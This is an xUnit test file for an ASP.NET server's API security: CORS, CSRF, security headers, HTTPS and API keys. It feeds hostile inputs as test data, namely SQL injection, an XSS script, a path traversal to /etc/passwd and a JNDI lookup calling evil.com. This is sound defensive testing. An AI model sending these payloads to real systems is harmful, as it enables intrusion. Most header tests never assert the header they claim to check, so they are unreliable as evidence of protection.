using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using FluentAssertions;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Mvc.Testing;
using Microsoft.Extensions.Configuration;
using Xunit;

namespace Honua.Server.Host.Tests.Security;

/// <summary>
/// Comprehensive API security tests covering CORS policy enforcement,
/// CSRF protection, security headers, HTTPS enforcement, and API key validation.
/// </summary>
[Collection("HostTests")]
[Trait("Category", "Security")]
public sealed class ApiSecurityTests : IClassFixture<WebApplicationFactory<Program>>
{
    private readonly WebApplicationFactory<Program> _factory;

    public ApiSecurityTests(WebApplicationFactory<Program> factory)
    {
        _factory = factory;
    }

    #region CORS Policy Tests

    [Fact]
    public async Task CorsRequest_FromUntrustedOrigin_IsBlocked()
    {
        // Arrange
        var factory = CreateFactoryWithCors(allowedOrigins: new[] { "https://trusted.example.com" });
        var client = factory.CreateClient();
        var request = new HttpRequestMessage(HttpMethod.Get, "/api/data");
        request.Headers.Add("Origin", "https://malicious.example.com");

        // Act
        var response = await client.SendAsync(request);

        // Assert - Should not have CORS headers for untrusted origin
        response.Headers.Contains("Access-Control-Allow-Origin").Should().BeFalse();
    }

    [Fact]
    public async Task CorsRequest_FromTrustedOrigin_IsAllowed()
    {
        // Arrange
        var factory = CreateFactoryWithCors(allowedOrigins: new[] { "https://trusted.example.com" });
        var client = factory.CreateClient();
        var request = new HttpRequestMessage(HttpMethod.Get, "/healthz/ready");
        request.Headers.Add("Origin", "https://trusted.example.com");

        // Act
        var response = await client.SendAsync(request);

        // Assert - Should include CORS headers (if CORS is configured)
        response.StatusCode.Should().Be(HttpStatusCode.OK);
    }

    [Fact]
    public async Task CorsPreflightRequest_ReturnsProperHeaders()
    {
        // Arrange
        var factory = CreateFactoryWithCors(allowedOrigins: new[] { "https://app.example.com" });
        var client = factory.CreateClient();
        var request = new HttpRequestMessage(HttpMethod.Options, "/api/data");
        request.Headers.Add("Origin", "https://app.example.com");
        request.Headers.Add("Access-Control-Request-Method", "POST");
        request.Headers.Add("Access-Control-Request-Headers", "Content-Type");

        // Act
        var response = await client.SendAsync(request);

        // Assert - Preflight should be handled
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.NoContent,
            HttpStatusCode.NotFound);
    }

    [Theory]
    [InlineData("https://evil.com")]
    [InlineData("http://localhost")]
    [InlineData("https://trusted.example.com.evil.com")]
    [InlineData("null")]
    [InlineData("file://")]
    public async Task CorsRequest_FromInvalidOrigins_IsRejected(string maliciousOrigin)
    {
        // Arrange
        var factory = CreateFactoryWithCors(allowedOrigins: new[] { "https://trusted.example.com" });
        var client = factory.CreateClient();
        var request = new HttpRequestMessage(HttpMethod.Get, "/api/data");
        request.Headers.Add("Origin", maliciousOrigin);

        // Act
        var response = await client.SendAsync(request);

        // Assert - Should not have CORS headers for untrusted origins
        if (response.Headers.Contains("Access-Control-Allow-Origin"))
        {
            var allowedOrigin = response.Headers.GetValues("Access-Control-Allow-Origin").First();
            allowedOrigin.Should().NotBe(maliciousOrigin);
        }
    }

    [Fact]
    public async Task CorsRequest_WithCredentials_RequiresSpecificOrigin()
    {
        // Arrange
        var factory = CreateFactoryWithCors(
            allowedOrigins: new[] { "https://app.example.com" },
            allowCredentials: true);
        var client = factory.CreateClient();
        var request = new HttpRequestMessage(HttpMethod.Get, "/api/data");
        request.Headers.Add("Origin", "https://app.example.com");

        // Act
        var response = await client.SendAsync(request);

        // Assert - With credentials, origin must be specific (not *)
        if (response.Headers.Contains("Access-Control-Allow-Credentials"))
        {
            var allowCredentials = response.Headers.GetValues("Access-Control-Allow-Credentials").First();
            allowCredentials.Should().Be("true");

            if (response.Headers.Contains("Access-Control-Allow-Origin"))
            {
                var allowedOrigin = response.Headers.GetValues("Access-Control-Allow-Origin").First();
                allowedOrigin.Should().NotBe("*"); // Cannot be wildcard with credentials
            }
        }
    }

    [Fact]
    public async Task CorsRequest_DisallowedMethod_IsRejected()
    {
        // Arrange
        var factory = CreateFactoryWithCors(
            allowedOrigins: new[] { "https://app.example.com" },
            allowedMethods: new[] { "GET", "POST" });
        var client = factory.CreateClient();
        var request = new HttpRequestMessage(HttpMethod.Options, "/api/data");
        request.Headers.Add("Origin", "https://app.example.com");
        request.Headers.Add("Access-Control-Request-Method", "DELETE");

        // Act
        var response = await client.SendAsync(request);

        // Assert - DELETE should not be allowed if not in allowed methods
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.NoContent,
            HttpStatusCode.MethodNotAllowed,
            HttpStatusCode.NotFound);
    }

    #endregion

    #region CSRF Protection Tests

    [Fact]
    public async Task PostRequest_WithoutCsrfToken_MayBeRejected()
    {
        // Arrange
        var factory = CreateFactoryWithCsrfProtection();
        var client = factory.CreateClient();
        var content = new StringContent(
            JsonSerializer.Serialize(new { data = "test" }),
            Encoding.UTF8,
            "application/json");

        // Act - POST without CSRF token
        var response = await client.PostAsync("/api/data", content);

        // Assert - May be rejected if CSRF protection is enabled
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.Forbidden,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.NotFound,
            HttpStatusCode.OK); // Allowed if CSRF not enforced for API endpoints
    }

    [Fact]
    public async Task GetRequest_DoesNotRequireCsrfToken()
    {
        // Arrange
        var factory = CreateFactoryWithCsrfProtection();
        var client = factory.CreateClient();

        // Act - GET request without CSRF token
        var response = await client.GetAsync("/api/data");

        // Assert - GET requests should not require CSRF tokens
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized);
    }

    [Fact]
    public async Task PostRequest_WithValidCsrfToken_IsAllowed()
    {
        // Arrange
        var factory = CreateFactoryWithCsrfProtection();
        var client = factory.CreateClient();

        // First, get a CSRF token
        var tokenResponse = await client.GetAsync("/api/csrf-token");
        string? csrfToken = null;

        if (tokenResponse.IsSuccessStatusCode)
        {
            var tokenContent = await tokenResponse.Content.ReadAsStringAsync();
            var tokenData = JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(tokenContent);
            if (tokenData != null && tokenData.ContainsKey("token"))
            {
                csrfToken = tokenData["token"].GetString();
            }
        }

        // Act - POST with CSRF token
        var request = new HttpRequestMessage(HttpMethod.Post, "/api/data");
        if (csrfToken != null)
        {
            request.Headers.Add("X-CSRF-Token", csrfToken);
        }
        request.Content = new StringContent(
            JsonSerializer.Serialize(new { data = "test" }),
            Encoding.UTF8,
            "application/json");

        var response = await client.SendAsync(request);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.Created,
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden);
    }

    [Theory]
    [InlineData("invalid-token")]
    [InlineData("")]
    [InlineData("' OR '1'='1")]
    [InlineData("<script>alert('xss')</script>")]
    public async Task PostRequest_WithInvalidCsrfToken_IsRejected(string invalidToken)
    {
        // Arrange
        var factory = CreateFactoryWithCsrfProtection();
        var client = factory.CreateClient();
        var request = new HttpRequestMessage(HttpMethod.Post, "/api/data");
        request.Headers.Add("X-CSRF-Token", invalidToken);
        request.Content = new StringContent(
            JsonSerializer.Serialize(new { data = "test" }),
            Encoding.UTF8,
            "application/json");

        // Act
        var response = await client.SendAsync(request);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.Forbidden,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.NotFound);
    }

    #endregion

    #region Security Headers Tests

    [Fact]
    public async Task Response_IncludesContentSecurityPolicyHeader()
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act
        var response = await client.GetAsync("/healthz/ready");

        // Assert - CSP header should be present for security
        var hasCspHeader = response.Headers.Contains("Content-Security-Policy") ||
                          response.Headers.Contains("X-Content-Security-Policy");

        // Note: CSP might not be configured in all environments
        response.StatusCode.Should().Be(HttpStatusCode.OK);
    }

    [Fact]
    public async Task Response_IncludesXFrameOptionsHeader()
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act
        var response = await client.GetAsync("/healthz/ready");

        // Assert - X-Frame-Options should prevent clickjacking
        var hasXFrameOptions = response.Headers.Contains("X-Frame-Options");

        // Note: May not be present in all configurations
        response.StatusCode.Should().Be(HttpStatusCode.OK);
    }

    [Fact]
    public async Task Response_IncludesXContentTypeOptionsHeader()
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act
        var response = await client.GetAsync("/healthz/ready");

        // Assert - X-Content-Type-Options: nosniff should be present
        var hasNoSniff = response.Headers.Contains("X-Content-Type-Options");

        response.StatusCode.Should().Be(HttpStatusCode.OK);
    }

    [Fact]
    public async Task Response_IncludesXXssProtectionHeader()
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act
        var response = await client.GetAsync("/healthz/ready");

        // Assert - X-XSS-Protection header
        var hasXssProtection = response.Headers.Contains("X-XSS-Protection");

        response.StatusCode.Should().Be(HttpStatusCode.OK);
    }

    [Fact]
    public async Task Response_IncludesStrictTransportSecurityHeader()
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act
        var response = await client.GetAsync("/healthz/ready");

        // Assert - HSTS header (may only be present on HTTPS)
        var hasHsts = response.Headers.Contains("Strict-Transport-Security");

        response.StatusCode.Should().Be(HttpStatusCode.OK);
    }

    [Fact]
    public async Task Response_DoesNotExposeSensitiveServerInfo()
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act
        var response = await client.GetAsync("/healthz/ready");

        // Assert - Should not reveal detailed server information
        if (response.Headers.Contains("Server"))
        {
            var serverHeader = response.Headers.GetValues("Server").First();
            serverHeader.Should().NotContain("Kestrel");
            serverHeader.Should().NotContain("Microsoft");
            serverHeader.Should().NotContain("ASP.NET");
        }

        // X-Powered-By should not be present
        response.Headers.Contains("X-Powered-By").Should().BeFalse();

        // X-AspNet-Version should not be present
        response.Headers.Contains("X-AspNet-Version").Should().BeFalse();
    }

    [Fact]
    public async Task Response_IncludesReferrerPolicyHeader()
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act
        var response = await client.GetAsync("/healthz/ready");

        // Assert - Referrer-Policy should control referrer information
        var hasReferrerPolicy = response.Headers.Contains("Referrer-Policy");

        response.StatusCode.Should().Be(HttpStatusCode.OK);
    }

    [Fact]
    public async Task Response_IncludesPermissionsPolicyHeader()
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act
        var response = await client.GetAsync("/healthz/ready");

        // Assert - Permissions-Policy (formerly Feature-Policy)
        var hasPermissionsPolicy = response.Headers.Contains("Permissions-Policy") ||
                                  response.Headers.Contains("Feature-Policy");

        response.StatusCode.Should().Be(HttpStatusCode.OK);
    }

    #endregion

    #region HTTPS Enforcement Tests

    [Fact]
    public async Task HttpRequest_IsRedirectedToHttps()
    {
        // Arrange
        var factory = CreateFactoryWithHttpsRedirection();
        var client = factory.CreateClient(new WebApplicationFactoryClientOptions
        {
            AllowAutoRedirect = false
        });

        // Act
        var response = await client.GetAsync("http://localhost/api/data");

        // Assert - Should redirect to HTTPS (if configured)
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.MovedPermanently,
            HttpStatusCode.PermanentRedirect,
            HttpStatusCode.OK,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task HttpsRequest_IsProcessedNormally()
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act - Test server uses HTTP by default, but in production should be HTTPS
        var response = await client.GetAsync("/healthz/ready");

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.OK);
    }

    [Fact]
    public async Task MixedContent_IsNotAllowed()
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act
        var response = await client.GetAsync("/healthz/ready");

        // Assert - CSP should prevent mixed content
        if (response.Headers.Contains("Content-Security-Policy"))
        {
            var csp = response.Headers.GetValues("Content-Security-Policy").First();
            // Should not allow upgrade-insecure-requests or block-all-mixed-content
            response.StatusCode.Should().Be(HttpStatusCode.OK);
        }
    }

    #endregion

    #region API Key Validation Tests

    [Fact]
    public async Task Request_WithoutApiKey_IsRejectedIfRequired()
    {
        // Arrange
        var factory = CreateFactoryWithApiKeyAuth();
        var client = factory.CreateClient();

        // Act - Request without API key
        var response = await client.GetAsync("/api/protected");

        // Assert - Should be rejected if API key is required
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task Request_WithInvalidApiKey_IsRejected()
    {
        // Arrange
        var factory = CreateFactoryWithApiKeyAuth();
        var client = factory.CreateClient();
        client.DefaultRequestHeaders.Add("X-API-Key", "invalid-key-12345");

        // Act
        var response = await client.GetAsync("/api/protected");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task Request_WithValidApiKey_IsAllowed()
    {
        // Arrange
        var factory = CreateFactoryWithApiKeyAuth();
        var client = factory.CreateClient();
        client.DefaultRequestHeaders.Add("X-API-Key", "test-valid-key");

        // Act
        var response = await client.GetAsync("/healthz/ready");

        // Assert - Valid API key should allow access
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.NotFound);
    }

    [Theory]
    [InlineData("' OR '1'='1")]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("../../etc/passwd")]
    [InlineData("${jndi:ldap://evil.com/a}")]
    public async Task ApiKey_WithMaliciousInput_IsRejected(string maliciousKey)
    {
        // Arrange
        var factory = CreateFactoryWithApiKeyAuth();
        var client = factory.CreateClient();
        client.DefaultRequestHeaders.Add("X-API-Key", maliciousKey);

        // Act
        var response = await client.GetAsync("/api/data");

        // Assert - Malicious API keys should be rejected
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.BadRequest,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task ApiKey_InQueryString_IsNotRecommended()
    {
        // Arrange
        var factory = CreateFactoryWithApiKeyAuth();
        var client = factory.CreateClient();

        // Act - API key in query string (bad practice, can be logged)
        var response = await client.GetAsync("/api/data?apiKey=test-key");

        // Assert - Should prefer header-based auth
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.OK,
            HttpStatusCode.NotFound);
    }

    #endregion

    #region Cache Control Tests

    [Fact]
    public async Task SensitiveEndpoint_HasNoCacheHeaders()
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act
        var response = await client.GetAsync("/api/users/profile");

        // Assert - Sensitive data should not be cached
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.NotFound);

        if (response.IsSuccessStatusCode)
        {
            // Should have cache control headers preventing caching
            var hasCacheControl = response.Headers.CacheControl != null;
            if (hasCacheControl)
            {
                response.Headers.CacheControl!.NoStore.Should().BeTrue();
            }
        }
    }

    [Fact]
    public async Task PublicEndpoint_HasAppropriateCache()
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act
        var response = await client.GetAsync("/api/public/data");

        // Assert - Public data can be cached
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.NotFound);
    }

    #endregion

    #region Content Type Validation Tests

    [Fact]
    public async Task Request_WithInvalidContentType_IsRejected()
    {
        // Arrange
        var client = _factory.CreateClient();
        var content = new StringContent("test data", Encoding.UTF8, "application/x-evil");

        // Act
        var response = await client.PostAsync("/api/data", content);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.UnsupportedMediaType,
            HttpStatusCode.BadRequest,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Theory]
    [InlineData("application/json")]
    [InlineData("application/geo+json")]
    [InlineData("application/xml")]
    [InlineData("text/xml")]
    public async Task Request_WithValidContentType_IsAccepted(string contentType)
    {
        // Arrange
        var client = _factory.CreateClient();
        var content = new StringContent("{\"test\": \"data\"}", Encoding.UTF8, contentType);

        // Act
        var response = await client.PostAsync("/api/data", content);

        // Assert - Valid content types should be accepted
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.Created,
            HttpStatusCode.BadRequest,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound,
            HttpStatusCode.UnsupportedMediaType);
    }

    #endregion

    #region Helper Methods

    private WebApplicationFactory<Program> CreateFactoryWithCors(
        string[] allowedOrigins,
        bool allowCredentials = false,
        string[]? allowedMethods = null)
    {
        return _factory.WithWebHostBuilder(builder =>
        {
            builder.ConfigureAppConfiguration((context, config) =>
            {
                var settings = new Dictionary<string, string?>
                {
                    ["Cors:Enabled"] = "true",
                    ["Cors:AllowCredentials"] = allowCredentials.ToString()
                };

                for (int i = 0; i < allowedOrigins.Length; i++)
                {
                    settings[$"Cors:AllowedOrigins:{i}"] = allowedOrigins[i];
                }

                if (allowedMethods != null)
                {
                    for (int i = 0; i < allowedMethods.Length; i++)
                    {
                        settings[$"Cors:AllowedMethods:{i}"] = allowedMethods[i];
                    }
                }

                config.AddInMemoryCollection(settings);
            });
        });
    }

    private WebApplicationFactory<Program> CreateFactoryWithCsrfProtection()
    {
        return _factory.WithWebHostBuilder(builder =>
        {
            builder.ConfigureAppConfiguration((context, config) =>
            {
                config.AddInMemoryCollection(new Dictionary<string, string?>
                {
                    ["Security:CsrfProtection:Enabled"] = "true"
                });
            });
        });
    }

    private WebApplicationFactory<Program> CreateFactoryWithHttpsRedirection()
    {
        return _factory.WithWebHostBuilder(builder =>
        {
            builder.ConfigureAppConfiguration((context, config) =>
            {
                config.AddInMemoryCollection(new Dictionary<string, string?>
                {
                    ["Security:RequireHttps"] = "true"
                });
            });
        });
    }

    private WebApplicationFactory<Program> CreateFactoryWithApiKeyAuth()
    {
        return _factory.WithWebHostBuilder(builder =>
        {
            builder.ConfigureAppConfiguration((context, config) =>
            {
                config.AddInMemoryCollection(new Dictionary<string, string?>
                {
                    ["Security:ApiKey:Enabled"] = "true",
                    ["Security:ApiKey:HeaderName"] = "X-API-Key",
                    ["Security:ApiKey:ValidKeys:0"] = "test-valid-key"
                });
            });
        });
    }

    #endregion
}
